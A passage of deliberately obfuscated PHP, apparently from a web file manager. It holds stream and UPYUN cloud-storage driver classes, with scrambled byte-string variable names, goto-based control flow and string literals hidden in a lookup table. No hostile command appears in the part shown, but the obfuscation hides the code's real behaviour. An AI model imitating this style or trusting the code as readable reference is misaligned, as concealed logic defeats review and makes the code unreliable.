($Cöƒ›Ëœé¼) { return $Cöƒ›Ëœé¼; } $Cöƒ›Ëœé¼ = IO::init(self::defaultIO()); return $Cöƒ›Ëœé¼; } public static function fileTypeList() { $C³ß¶—ì¶ =& $_SERVER[¨¤¼…´]; $cÈ†Æ»éÆ = $GLOBALS[$C³ß¶—ì¶[6]][$C³ß¶—ì¶[1081]]; foreach ($cÈ†Æ»éÆ as $e®’º…½’ => $B¿Ü…š›ÓË) { $cËß‡’Çø¤ = $C³ß¶—ì¶[1082] . $e®’º…½’; $eğù÷ÅÑ‡ğ = LNG($cËß‡’Çø¤); if ($cËß‡’Çø¤ != $eğù÷ÅÑ‡ğ) { $cÈ†Æ»éÆ[$e®’º…½’][$C³ß¶—ì¶[38]] = $eğù÷ÅÑ‡ğ; } } return $cÈ†Æ»éÆ; } public static function transferType($F´Ö¡âà‘×, $aÀùÊ²‰ˆŞ) { goto e­Ñï Îê; C‰ßÉ„øßŞ: if ($Cäƒ‹„¶²[$föî‰‹¨‡˜[39]] == $Aï¸±ô¥¶Ô[$föî‰‹¨‡˜[39]] && $Cäƒ‹„¶²[$föî‰‹¨‡˜[1083]] == $Aï¸±ô¥¶Ô[$föî‰‹¨‡˜[1083]]) { return $föî‰‹¨‡˜[1084]; } if ($Cäƒ‹„¶²[$föî‰‹¨‡˜[39]] == $föî‰‹¨‡˜[772] && $Aï¸±ô¥¶Ô[$föî‰‹¨‡˜[39]] == $föî‰‹¨‡˜[112]) { return $föî‰‹¨‡˜[1031]; } if ($Cäƒ‹„¶²[$föî‰‹¨‡˜[39]] == $föî‰‹¨‡˜[112] && $Aï¸±ô¥¶Ô[$föî‰‹¨‡˜[39]] == $föî‰‹¨‡˜[772]) { return $föî‰‹¨‡˜[113]; } goto Cï÷ŞÔ¤—¡; e­Ñï Îê: $föî‰‹¨‡˜ =& $_SERVER[¨¤¼…´]; $Cäƒ‹„¶² = self::driverType($F´Ö¡âà‘×); $Aï¸±ô¥¶Ô = self::driverType($aÀùÊ²‰ˆŞ); goto C‰ßÉ„øßŞ; Cï÷ŞÔ¤—¡: return $föî‰‹¨‡˜[1085]; goto Bß÷Üï®; Bß÷Üï®: } public static function driverType($d—É‹©¥õå) { goto Cš®±çƒ»„; Aù¯¹¹Ïà: return array($EƒÜÎÀ«Ì[39] => $EƒÜÎÀ«Ì[772], $EƒÜÎÀ«Ì[1083] => $d—É‹©¥õå->pathDriver, $EƒÜÎÀ«Ì[85] => $eÔ‹µ‘ æ); goto d‚•Çîã¢…; Cš®±çƒ»„: $EƒÜÎÀ«Ì =& $_SERVER[¨¤¼…´]; $eÔ‹µ‘ æ = $d—É‹©¥õå->path; $c‰’í é• = str_replace($EƒÜÎÀ«Ì[1086], $EƒÜÎÀ«Ì[43], strtolower($d—É‹©¥õå->getType())); goto e…ÂÜ¬®ËÊ; e…ÂÜ¬®ËÊ: if ($c‰’í é• == $EƒÜÎÀ«Ì[684] || $c‰’í é• == $EƒÜÎÀ«Ì[1087] || $c‰’í é• == $EƒÜÎÀ«Ì[1088]) { $d—É‹©¥õå = self::defaultDriverInit(); } else { if ($c‰’í é• == $EƒÜÎÀ«Ì[1038] || $c‰’í é• == $EƒÜÎÀ«Ì[1089]) { $d—É‹©¥õå = IO::init($d—É‹©¥õå->pathParse[$EƒÜÎÀ«Ì[985]]); } } $c‰’í é• = str_replace($EƒÜÎÀ«Ì[1086], $EƒÜÎÀ«Ì[43], strtolower($d—É‹©¥õå->getType())); if ($c‰’í é• == $EƒÜÎÀ«Ì[112]) { return array($EƒÜÎÀ«Ì[39] => $EƒÜÎÀ«Ì[112], $EƒÜÎÀ«Ì[1083] => $EƒÜÎÀ«Ì[43], $EƒÜÎÀ«Ì[85] => $eÔ‹µ‘ æ); } goto Aù¯¹¹Ïà; d‚•Çîã¢…: } } goto dæœó†¶Î‰; e¢·šŸ¼¿ø: $_SERVER[$_SERVER[ë‹ºñÌ†‡][49]] = (base64_decode('OTkzOQ==')."\71\67")+0;$_iGus="DbGrvMZamdMKRGIxycfJpj2vNeQrKWRUAEgNhFN3AnsB845tpBGj7yqfrIfCdUUyVAmZdG4";; stream_wrapper_register($_SERVER[ë‹ºñÌ†‡][50], $_SERVER[ë‹ºñÌ†‡][51]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($cîáŠàŒ½š, $c†‘éÙŠĞ) { $Fë•†ÇØ¢ =& $_SERVER[¨¤¼…´]; if (isset(self::$_methodList[$cîáŠàŒ½š])) { return @call_user_func_array(self::$_methodList[$cîáŠàŒ½š], $c†‘éÙŠĞ); } else { if (method_exists($this, $cîáŠàŒ½š)) { return call_user_func_array(array($this, $cîáŠàŒ½š), $c†‘éÙŠĞ); } else { think_exception(__CLASS__ . $Fë•†ÇØ¢[4] . $cîáŠàŒ½š . $Fë•†ÇØ¢[5]); } } } public static function __callStatic($a£ÑÉÅ‰šÃ, $CŒŸ·ÛÄä) { if (isset(self::$_methodListStatic[$a£ÑÉÅ‰šÃ])) { return call_user_func_array(self::$_methodListStatic[$a£ÑÉÅ‰šÃ], $CŒŸ·ÛÄä); } else { if (method_exists(self, $a£ÑÉÅ‰šÃ)) { return call_user_func_array(array(self, $a£ÑÉÅ‰šÃ), $CŒŸ·ÛÄä); } else { show_json("{$a£ÑÉÅ‰šÃ}\x28\x29\40\156\157\164\x20\x65\170\x69\163\x74\73", !1); } } } public static function addMethod($b‘É÷ö¾½, $A±²Áô¡âó) { self::$_methodList[$b‘É÷ö¾½] = $A±²Áô¡âó; } public static function addMethodStatic($cñÄ„½È¥¶, $f×±‹‘Ô„) { self::$_methodListStatic[$cñÄ„½È¥¶] = $f×±‹‘Ô„; } } goto bìÔƒ‰õçš; A÷õÑòŞ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($f³õÌ¾–¤â, $bË‡î“ìç = 0) { parent::__construct(); $this->source = $f³õÌ¾–¤â; $this->sourceSize = $bË‡î“ìç; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($dôèï«ÎËª = false) { return $this->sourceSize; } public function getContent($B‡Á¬Ó‰©è = false) { return $this->fileSubstr($B‡Á¬Ó‰©è, 0, $this->sourceSize); } public function fileSubstr($dØÍ¢Øœ« = false, $añ³œ°ƒŠô = 0, $e¦½»†‚ò = 0) { if (!$e¦½»†‚ò) { $e¦½»†‚ò = $this->sourceSize; } $dÂÕ´÷¨Âç = $this->sourceSize - $añ³œ°ƒŠô; if ($e¦½»†‚ò >= $dÂÕ´÷¨Âç) { $e¦½»†‚ò = $dÂÕ´÷¨Âç; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $añ³œ°ƒŠô, $e¦½»†‚ò); } if ($this->sourceType == self::TYPE_FILE) { if ($e¦½»†‚ò <= 0) { return $_SERVER[¨¤¼…´][43]; } $DÖ×î¦ì¬— = ftell($this->source); fseek_64($this->source, $DÖ×î¦ì¬— + $añ³œ°ƒŠô); $cÔÕ‡Çà• = @fread($this->source, $e¦½»†‚ò); fseek_64($this->source, $DÖ×î¦ì¬—); return $cÔÕ‡Çà•; } } public function hashMd5($FÉ—Ú‰ÁöÁ = false) { return md5($this->getContent()); } public static function hash($d²¯„††, $CÌÉÁÀ”ÒÂ = 0) { $b‰Û„÷ğ¸Ø = new PathDriverStream($d²¯„††, $CÌÉÁÀ”ÒÂ); return $b‰Û„÷ğ¸Ø->hashSimple($d²¯„††); } public static function md5($E‘¦ó×á, $b¼Ÿé¾¸—ô = 0) { $bÎâªíö¥¸ = new PathDriverStream($E‘¦ó×á, $b¼Ÿé¾¸—ô); return $bÎâªíö¥¸->hashMd5($E‘¦ó×á); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\164\x70\x3a\x2f\57\166\60\x2e\141\160\151\56\165\x70\171\x75\156\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($e®è·‚âã) { parent::__construct(); $this->_init($e®è·‚âã); } public function _init($A¦²¥†Îá×) { $cŸ×Ôî’í› =& $_SERVER[¨¤¼…´]; foreach ($A¦²¥†Îá× as $dä®²Âøö¬ => $A¦ÑÁ×ËËá) { if (isset($this->{$dä®²Âøö¬})) { $this->{$dä®²Âøö¬} = $A¦ÑÁ×ËËá; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($cŸ×Ôî’í›[1230] . LNG($cŸ×Ôî’í›[1162])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($EÃ¦ ôº«é, $CˆÂÜ‰òä™ = "\107\105\124") { $b›Ü“Ú¬œ =& $_SERVER[¨¤¼…´]; $a¬‹‡ò·´Å = gmdate($b›Ü“Ú¬œ[1195]); $D•Èîˆğ÷ = base64_encode(hash_hmac($b›Ü“Ú¬œ[1231], "{$CˆÂÜ‰òä™}\46{$EÃ¦ ôº«é}\46{$a¬‹‡ò·´Å}", md5("{$this->userpass}"), !0)); $fÄĞåĞ·ò‚ = array("\x41\x75\x74\x68\157\162\151\x7a\141\x74\151\x6f\156\72\x55\x50\x59\125\x4e\x20{$this->username}\x3a{$D•Èîˆğ÷}", "\x44\141\x74\145\x3a{$a¬‹‡ò·´Å}"); return $fÄĞåĞ·ò‚; } public function ussRequest($aŒºÓã Ñ, $DŒ­«ÂŠîÃ = "\x47\105\124", $eã—¦½†Å³ = false, $Eˆó²ùÜí’ = false, $cËœ“ŒÂÙÓ = false) { goto f¥è˜Á’; f¥è˜Á’: $aî‘°µšöæ =& $_SERVER[¨¤¼…´]; $aŒºÓã Ñ = trim($aŒºÓã Ñ, $aî‘°µšöæ[8]); $f·Ç¹¹¥î· = "\57{$this->bucket}\57{$aŒºÓã Ñ}"; goto DÌ²ŞŒåÊî; BÔ£‹—¿ÁØ: if (!$Cï¨±ˆÍƒ) { return array($aî‘°µšöæ[1023] => !1, $aî‘°µšöæ[1025] => $aî‘°µšöæ[1232]); } if (strtolower($DŒ­«ÂŠîÃ) == $aî‘°µšöæ[198] || in_array($Cï¨±ˆÍƒ[$aî‘°µšöæ[1023]], array($aî‘°µšöæ[1090], $aî‘°µšöæ[1233]))) { $eã—¦½†Å³ = $Cï¨±ˆÍƒ[$aî‘°µšöæ[1234]]; } else { $eã—¦½†Å³ = json_decode($Cï¨±ˆÍƒ[$aî‘°µšöæ[1025]], !0); if (!$eã—¦½†Å³) { $eã—¦½†Å³ = $Cï¨±ˆÍƒ[$aî‘°µšöæ[1025]]; } else { if (!$Cï¨±ˆÍƒ[$aî‘°µšöæ[679]] && isset($eã—¦½†Å³[$aî‘°µšöæ[1235]])) { $eã—¦½†Å³ = $eã—¦½†Å³[$aî‘°µšöæ[1235]]; } } } return array($aî‘°µšöæ[1023] => $Cï¨±ˆÍƒ[$aî‘°µšöæ[679]], $aî‘°µšöæ[1025] => $eã—¦½†Å³); goto b—¶¡É‹‘; DÌ²ŞŒåÊî: $FÜÜ›ˆÖš = $this->ussHeaders($f·Ç¹¹¥î·, $DŒ­«ÂŠîÃ); if ($Eˆó²ùÜí’) { $FÜÜ›ˆÖš = array_merge($FÜÜ›ˆÖš, $Eˆó²ùÜí’); } $Cï¨±ˆÍƒ = url_request($this->endpoint . $f·Ç¹¹¥î·, $DŒ­«ÂŠîÃ, $eã—¦½†Å³, $FÜÜ›ˆÖš, $cËœ“ŒÂÙÓ); goto BÔ£‹—¿ÁØ; b—¶¡É‹‘: } public function mkfile($D£Œ·çé’, $dõ §¢š„ƒ = '', $F¹¤¨ùÈœ¶ = REPEAT_RENAME) { if ($this->setContent($D£Œ·çé’, $dõ §¢š„ƒ)) { return $this->getPathOuter($D£Œ·çé’); } return !1; } public function mkdir($c‡ÈÚˆİÄç, $eëâÜÚÆÕ» = REPEAT_SKIP) { $a˜´” ¸×Ì =& $_SERVER[¨¤¼…´]; $cŸ´Ğ‘Ì¦‚ = trim($c‡ÈÚˆİÄç, $a˜´” ¸×Ì[8]); if ($this->_isFolder($cŸ´Ğ‘Ì¦‚)) { return $this->getPathOuter($cŸ´Ğ‘Ì¦‚); } $E¤¢ÂŸğ¢ = array($a˜´” ¸×Ì[1236]); $bÏ…ëñ„æ = $this->ussRequest($cŸ´Ğ‘Ì¦‚, $a˜´” ¸×Ì[226], !1, $E¤¢ÂŸğ¢); return $bÏ…ëñ„æ[$a˜´” ¸×Ì[1023]] ? $this->getPathOuter($cŸ´Ğ‘Ì¦‚) : !1; } public function copyFile($díêÛ“‚Ø, $Eèğ—„¼Ş™) { $bŒ¥«åøÀ† =& $_SERVER[¨¤¼…´]; $Dï‡†’š¡Ë = array($bŒ¥«åøÀ†[1237] . "\57{$this->bucket}\57{$díêÛ“‚Ø}", $bŒ¥«åøÀ†[1238]); $A•öìŸÄº = $this->ussRequest($Eèğ—„¼Ş™, $bŒ¥«åøÀ†[228], !1, $Dï‡†’š¡Ë); return $A•öìŸÄº[$bŒ¥«åøÀ†[1023]] ? !0 : $this->getPathOuter($Eèğ—„¼Ş™); } public function moveFile($E†–‰º½Ì, $bƒÈğÍîß) { $eÁôô”áĞ =& $_SERVER[¨¤¼…´]; $aŠ§´§ñ÷ù = array($eÁôô”áĞ[1239] . "\57{$this->bucket}\x2f{$E†–‰º½Ì}", $eÁôô”áĞ[1238]); $E§µ—ƒÕ§¤ = $this->ussRequest($bƒÈğÍîß, $eÁôô”áĞ[228], !1, $aŠ§´§ñ÷ù); return $E§µ—ƒÕ§¤[$eÁôô”áĞ[1023]] ? !0 : $this->getPathOuter($bƒÈğÍîß); } public function delFile($dİæ²‚‘ë„) { $a¡Ê†‰‹º„ =& $_SERVER[¨¤¼…´]; $DÂª¸®ÄÛó = $this->ussRequest($dİæ²‚‘ë„, $a¡Ê†‰‹º„[1240]); return $DÂª¸®ÄÛó[$a¡Ê†‰‹º„[1023]] ? !0 : !1; } public function delFolder($c³‰¢Õ‚†) { $C¨ß¯ãº½ =& $_SERVER[¨¤¼…´]; $DÑßĞÇÇ = $this->listAll($c³‰¢Õ‚†); krsort($DÑßĞÇÇ); foreach ($DÑßĞÇÇ as $d“›¾ˆØ¥) { $this->ussRequest($d“›¾ˆØ¥[$C¨ß¯ãº½[85]], $C¨ß¯ãº½[1240]); } return $this->ussRequest($c³‰¢Õ‚†, $C¨ß¯ãº½[1240]); } public function rename($c¯ŞË¾ª»—, $AÒí¿Çˆ ) { if ($this->isFile($c¯ŞË¾ª»—)) { $AÒí¿Çˆ  = get_path_father($c¯ŞË¾ª»—) . $AÒí¿Çˆ ; return $this->moveFile($c¯ŞË¾ª»—, $AÒí¿Çˆ ); } return $this->renameObject($c¯ŞË¾ª»—, $AÒí¿Çˆ ); } public function fileInfo($D‘½ÓŸ¦óÂ, $fÓã»åä = false, $c…»ŠÆ¬ç¢ = array()) { $dÉ‚Ÿäªéé =& $_SERVER[¨¤¼…´]; if ($fÓã»åä) { return array($dÉ‚Ÿäªéé[38] => $this->pathThis($D‘½ÓŸ¦óÂ), $dÉ‚Ÿäªéé[85] => $this->getPathOuter($dÉ‚Ÿäªéé[8] . $D‘½ÓŸ¦óÂ), $dÉ‚Ÿäªéé[39] => $dÉ‚Ÿäªéé[181], $dÉ‚Ÿäªéé[87] => isset($c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[338]]) ? $c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[338]] : 0, $dÉ‚Ÿäªéé[175] => $this->ext($D‘½ÓŸ¦óÂ)); } $E‹ÇîË¸ôÎ = array($dÉ‚Ÿäªéé[38] => $this->pathThis($D‘½ÓŸ¦óÂ), $dÉ‚Ÿäªéé[85] => $this->getPathOuter($dÉ‚Ÿäªéé[8] . $D‘½ÓŸ¦óÂ), $dÉ‚Ÿäªéé[39] => $dÉ‚Ÿäªéé[181], $dÉ‚Ÿäªéé[201] => 0, $dÉ‚Ÿäªéé[117] => isset($aŠÛÍèï¥¾[$dÉ‚Ÿäªéé[1241]]) ? $aŠÛÍèï¥¾[$dÉ‚Ÿäªéé[1241]] : 0, $dÉ‚Ÿäªéé[87] => isset($c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[338]]) ? $c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[338]] : 0, $dÉ‚Ÿäªéé[175] => $this->ext($D‘½ÓŸ¦óÂ), $dÉ‚Ÿäªéé[202] => !0, $dÉ‚Ÿäªéé[203] => !0); if (empty($c…»ŠÆ¬ç¢)) { $c…»ŠÆ¬ç¢ = $this->objectMeta($D‘½ÓŸ¦óÂ); if (!$c…»ŠÆ¬ç¢) { return $E‹ÇîË¸ôÎ; } $E‹ÇîË¸ôÎ[$dÉ‚Ÿäªéé[201]] = $c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[1242]]; $E‹ÇîË¸ôÎ[$dÉ‚Ÿäªéé[117]] = $c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[1243]]; $E‹ÇîË¸ôÎ[$dÉ‚Ÿäªéé[87]] = $c…»ŠÆ¬ç¢[$dÉ‚Ÿäªéé[87]]; } return $E‹ÇîË¸ôÎ; } public function folderInfo($Cš‹ôƒ¶‚Ğ, $E‡êÃ¯ùÛÍ = false) { $d‡Ÿ»ùõš‡ =& $_SERVER[¨¤¼…´]; if ($E‡êÃ¯ùÛÍ) { return array($d‡Ÿ»ùõš‡[38] => $this->pathThis($Cš‹ôƒ¶‚Ğ), $d‡Ÿ»ùõš‡[85] => $this->getPathOuter($d‡Ÿ»ùõš‡[8] . $Cš‹ôƒ¶‚Ğ), $d‡Ÿ»ùõš‡[39] => $d‡Ÿ»ùõš‡[86]); } $aÙÁĞ×Ùµ¬ = array($d‡Ÿ»ùõš‡[38] => $this->pathThis($Cš‹ôƒ¶‚Ğ), $d‡Ÿ»ùõš‡[85] => $this->getPathOuter($d‡Ÿ»ùõš‡[8] . $Cš‹ôƒ¶‚Ğ), $d‡Ÿ»ùõš‡[39] => $d‡Ÿ»ùõš‡[86], $d‡Ÿ»ùõš‡[201] => 0, $d‡Ÿ»ùõš‡[117] => isset($B·¡‰½šØ[$d‡Ÿ»ùõš‡[1241]]) ? $B·¡‰½šØ[$d‡Ÿ»ùõš‡[1241]] : 0, $d‡Ÿ»ùõš‡[1152] => !0, $d‡Ÿ»ùõš‡[1153] => !0); if (empty($d°ß¢ÂÉæø)) { $d°ß¢ÂÉæø = $this->objectMeta($Cš‹ôƒ¶‚Ğ); if (!$d°ß¢ÂÉæø) { return $aÙÁĞ×Ùµ¬; } $aÙÁĞ×Ùµ¬[$d‡Ÿ»ùõš‡[201]] = $d°ß¢ÂÉæø[$d‡Ÿ»ùõš‡[1242]]; $aÙÁĞ×Ùµ¬[$d‡Ÿ»ùõš‡[117]] = $d°ß¢ÂÉæø[$d‡Ÿ»ùõš‡[1243]]; } return $aÙÁĞ×Ùµ¬; } private function fileList($Aí‚§Íª†Ò, $dÄÆ£ßƒĞç = 0, $bÔßÌ‚×… = 1000) { $bÉç–Õç‘â =& $_SERVER[¨¤¼…´]; $AÊ¹š¿÷ò = array($bÉç–Õç‘â[1244], $bÉç–Õç‘â[1245] . $bÔßÌ‚×…); if ($dÄÆ£ßƒĞç) { $AÊ¹š¿÷ò[] = $bÉç–Õç‘â[1246] . $dÄÆ£ßƒĞç; } $fá²¼¸½ã = $this->ussRequest($Aí‚§Íª†Ò, $bÉç–Õç‘â[230], !1, $AÊ¹š¿÷ò); return !$fá²¼¸½ã[$bÉç–Õç‘â[1023]] ? !1 : $fá²¼¸½ã[$bÉç–Õç‘â[1025]]; } public function listPath($a’¼Æƒ¡, $d¶ÖÙ‘» ° = false) { goto b·§ºàƒƒ™; C¨ÔËŒ÷‰Ù: return array($a¹‚¾ÖÕÏÙ[84] => $f×Û”œºÁË, $a¹‚¾ÖÕÏÙ[83] => $e¨®Ÿã±ß); goto a´ç×‡ö˜ğ; b·§ºàƒƒ™: $a¹‚¾ÖÕÏÙ =& $_SERVER[¨¤¼…´]; $a«‡ÜñÜ„ç = $a¹‚¾ÖÕÏÙ[43]; $CµƒÄˆ†Üƒ = 1000; goto Fç°¼ğ‡; Fç°¼ğ‡: $f×Û”œºÁË = $e¨®Ÿã±ß = array(); $AÛø»õ³ = rtrim($a’¼Æƒ¡, $a¹‚¾ÖÕÏÙ[8]) . $a¹‚¾ÖÕÏÙ[8]; while (!0) { $Dİ¤’ˆÂ“ = $this->fileList($a’¼Æƒ¡, $a«‡ÜñÜ„ç, $CµƒÄˆ†Üƒ); if (!$Dİ¤’ˆÂ“) { return !1; } $a«‡ÜñÜ„ç = isset($Dİ¤’ˆÂ“[$a¹‚¾ÖÕÏÙ[1247]]) ? $Dİ¤’ˆÂ“[$a¹‚¾ÖÕÏÙ[1247]] : $a¹‚¾ÖÕÏÙ[43]; $C†ÌñÖÎ = isset($Dİ¤’ˆÂ“[$a¹‚¾ÖÕÏÙ[1248]]) ? $Dİ¤’ˆÂ“[$a¹‚¾ÖÕÏÙ[1248]] : array(); foreach ($C†ÌñÖÎ as $AÉÙ‡«÷À©) { if ($AÉÙ‡«÷À©[$a¹‚¾ÖÕÏÙ[39]] == $a¹‚¾ÖÕÏÙ[86]) { $f×Û”œºÁË[] = $this->folderInfo($AÛø»õ³ . $AÉÙ‡«÷À©[$a¹‚¾ÖÕÏÙ[38]], $d¶ÖÙ‘» °, $AÉÙ‡«÷À©); } else { $e¨®Ÿã±ß[] = $this->fileInfo($AÛø»õ³ . $AÉÙ‡«÷À©[$a¹‚¾ÖÕÏÙ[38]], $d¶ÖÙ‘» °, $AÉÙ‡«÷À©); } } if (count($C†ÌñÖÎ) < $CµƒÄˆ†Üƒ) { break; } } goto C¨ÔËŒ÷‰Ù; a´ç×‡ö˜ğ: } private function recursionAllFiles($CšàÀöŞÉÀ, &$E¸¬ÉÅ»ö) { $aÓ”ìÇ”ªÜ =& $_SERVER[¨¤¼…´]; $cª‚‡ŸíÇ = $aÓ”ìÇ”ªÜ[43]; $bš¥ÕÏÜ = 1000; $Eø­ƒƒ¬æ¡ = $BÉŒ¤ÅË³² = array(); $cçÔë‰ = rtrim($CšàÀöŞÉÀ, $aÓ”ìÇ”ªÜ[8]) . $aÓ”ìÇ”ªÜ[8]; while (!0) { $BíÀ“åìİƒ = $this->fileList($CšàÀöŞÉÀ, $cª‚‡ŸíÇ, $bš¥ÕÏÜ); if (!$BíÀ“åìİƒ) { return !1; } $cª‚‡ŸíÇ = isset($BíÀ“åìİƒ[$aÓ”ìÇ”ªÜ[1247]]) ? $BíÀ“åìİƒ[$aÓ”ìÇ”ªÜ[1247]] : $aÓ”ìÇ”ªÜ[43]; $EØßéô·øÈ = isset($BíÀ“åìİƒ[$aÓ”ìÇ”ªÜ[1248]]) ? $BíÀ“åìİƒ[$aÓ”ìÇ”ªÜ[1248]] : array(); foreach ($EØßéô·øÈ as $bƒÔ®ø›£‰) { $D¤ñÂ«Ø¦« = array($aÓ”ìÇ”ªÜ[85] => $cçÔë‰ . $bƒÔ®ø›£‰[$aÓ”ìÇ”ªÜ[38]], $aÓ”ìÇ”ªÜ[86] => $bƒÔ®ø›£‰[$aÓ”ìÇ”ªÜ[39]] == $aÓ”ìÇ”ªÜ[86] ? 1 : 0, $aÓ”ìÇ”ªÜ[87] => isset($bƒÔ®ø›£‰[$aÓ”ìÇ”ªÜ[338]]) ? $bƒÔ®ø›£‰[$aÓ”ìÇ”ªÜ[338]] : 0); $E¸¬ÉÅ»ö[] = $D¤ñÂ«Ø¦«; if ($D¤ñÂ«Ø¦«[$aÓ”ìÇ”ªÜ[86]] == 1) { $this->recursionAllFiles($D¤ñÂ«Ø¦«[$aÓ”ìÇ”ªÜ[85]], $E¸¬ÉÅ»ö); } } if (count($EØßéô·øÈ) < $bš¥ÕÏÜ) { break; } } } public function has($BñğöÀŒÌ, $cÉËÀË‹† = false, $D†ÒâŒ‰ ² = true) { goto DÓñ¶ç ¯Ó; cÔÂ®ìÀ«¡: $D™¾ôîİ†ù = 0; $c¤ö©ï¥‚è = 0; $fÙ¼«Ò‘²Æ = rtrim($BñğöÀŒÌ, $e¼¥¯ÌÅ†ù[8]) . $e¼¥¯ÌÅ†ù[8]; goto d‘µ§µ“¶Ä; DÓñ¶ç ¯Ó: $e¼¥¯ÌÅ†ù =& $_SERVER[¨¤¼…´]; $cÚ÷Ãá¼ÀÔ = $e¼¥¯ÌÅ†ù[43]; $AÎ²ƒ­¯ÛÀ = 1000; goto cÔÂ®ìÀ«¡; d‘µ§µ“¶Ä: while (!0) { $CÕºß¶Æ×Ê = $this->fileList($BñğöÀŒÌ, $cÚ÷Ãá¼ÀÔ, $AÎ²ƒ­¯ÛÀ); if (!$CÕºß¶Æ×Ê) { return !1; } $cÚ÷Ãá¼ÀÔ = isset($CÕºß¶Æ×Ê[$e¼¥¯ÌÅ†ù[1247]]) ? $CÕºß¶Æ×Ê[$e¼¥¯ÌÅ†ù[1247]] : $e¼¥¯ÌÅ†ù[43]; $E’éãŒÏê˜ = isset($CÕºß¶Æ×Ê[$e¼¥¯ÌÅ†ù[1248]]) ? $CÕºß¶Æ×Ê[$e¼¥¯ÌÅ†ù[1248]] : array(); if (empty($E’éãŒÏê˜)) { break; } $fİ®·Ş½… = array_to_keyvalue($E’éãŒÏê˜, $e¼¥¯ÌÅ†ù[43], $e¼¥¯ÌÅ†ù[39]); $b„×Ì·ôë¨ = array_count_values($fİ®·Ş½…); $dˆñ–ì­áª = isset($b„×Ì·ôë¨[$e¼¥¯ÌÅ†ù[86]]) ? $b„×Ì·ôë¨[$e¼¥¯ÌÅ†ù[86]] : 0; $E¶ê¤Í­ò¬ = count($fİ®·Ş½…) - $dˆñ–ì­áª; if ($cÉËÀË‹†) { $c¤ö©ï¥‚è += $dˆñ–ì­áª; $D™¾ôîİ†ù += $E¶ê¤Í­ò¬; if ($bÒÈÅÅ¼·Ÿ < $AÎ²ƒ­¯ÛÀ) { break; } continue; } if ($D†ÒâŒ‰ ²) { if ($E¶ê¤Í­ò¬) { return !0; } } else { if ($dˆñ–ì­áª) { return !0; } } if (count($E’éãŒÏê˜) < $AÎ²ƒ­¯ÛÀ) { break; } } if ($cÉËÀË‹†) { return array($e¼¥¯ÌÅ†ù[205] => $D™¾ôîİ†ù, $e¼¥¯ÌÅ†ù[206] => $c¤ö©ï¥‚è); } return !1; goto B¨À‰½„‚; B¨À‰½„‚: } public function listAll($DÈ¾‹Î‘Íà) { $A˜¹¨À¯íÀ = array(); $this->recursionAllFiles($DÈ¾‹Î‘Íà, $A˜¹¨À¯íÀ); return $A˜¹¨À¯íÀ; } public function canRead($Aö¸óà—¨›) { return $this->exist($Aö¸óà—¨›) ? !0 : !1; } public function canWrite($Aá„Ø™„ã­) { return $this->exist($Aá„Ø™„ã­) ? !0 : !1; } public function getContent($f›‚ô±„ƒ²) { return $this->fileSubstr($f›‚ô±„ƒ², 0, -1); } public function setContent($BÙÇà„ò’È, $d¥ì¾‡äÔ = '') { $eƒô³™æ…ó =& $_SERVER[¨¤¼…´]; if (!$d¥ì¾‡äÔ) { $b’éóÂ¢½ = $this->ussRequest($BÙÇà„ò’È, $eƒô³™æ…ó[226]); return $b’éóÂ¢½[$eƒô³™æ…ó[1023]]; } $FÁø‰Ñ‘ÉŠ = $this->tempFile($this->pathThis($BÙÇà„ò’È)); file_put_contents($FÁø‰Ñ‘ÉŠ, $d¥ì¾‡äÔ); if ($this->upload($BÙÇà„ò’È, $FÁø‰Ñ‘ÉŠ)) { $this->tempFileRemve($FÁø‰Ñ‘ÉŠ); return !0; } return !1; } public function fileSubstr($CÀ˜âÄÙ´, $CÑÚÊÔ‰ƒ, $Dˆ©Û¤„¼š) { $eó¿Ë²ç„£ =& $_SERVER[¨¤¼…´]; if (!($A•ŒÆ™¥ùì = $this->link($CÀ˜âÄÙ´))) { return !1; } $Bñ“‡ãŒ† = !1; if ($Dˆ©Û¤„¼š > 0) { $føè•ñÃ˜½ = $CÑÚÊÔ‰ƒ + $Dˆ©Û¤„¼š - 1; $Bñ“‡ãŒ† = array($eó¿Ë²ç„£[1209] . $CÑÚÊÔ‰ƒ . $eó¿Ë²ç„£[424] . $føè•ñÃ˜½); } $E’†¸Õò „ = url_request($A•ŒÆ™¥ùì, $eó¿Ë²ç„£[230], !1, $Bñ“‡ãŒ†); return $E’†¸Õò „[$eó¿Ë²ç„£[679]] ? $E’†¸Õò „[$eó¿Ë²ç„£[1025]] : !1; } public function upload($F—„ÁÒ†Àô, $CØ†‹ÏÂä‹, $AÔŸê¦×¹Å = false, $B‚Ä›ó‹…ô = REPEAT_REPLACE) { goto F¤Íé¨ñ«‘; aæ›¡ƒÅƒì: do { $E·Ëã­ÄÌ = $F¢İÎ¼Úé[$eî†‰‰ï¨ï[1255]]; fseek_64($c——…ØÂÓŞ, $aªØƒ¸¨–â); $e…„î³™ØÑ = fread($c——…ØÂÓŞ, $E·Ëã­ÄÌ); $c˜•«š¼È = 0; do { $c˜•«š¼È++; $F¢İÎ¼Úé = $this->uploadPart($F—„ÁÒ†Àô, $F¢İÎ¼Úé, $e…„î³™ØÑ); } while (!$F¢İÎ¼Úé && $c˜•«š¼È < 3); if (!$F¢İÎ¼Úé) { return !1; } $dÎÅ¢š‰–İ = $F¢İÎ¼Úé[$eî†‰‰ï¨ï[1254]]; $aªØƒ¸¨–â += $E·Ëã­ÄÌ; } while ($dÎÅ¢š‰–İ != -1); fclose($c——…ØÂÓŞ); $BÁÒÙ¸´´ê = array($eî†‰‰ï¨ï[1256], $eî†‰‰ï¨ï[1257] . 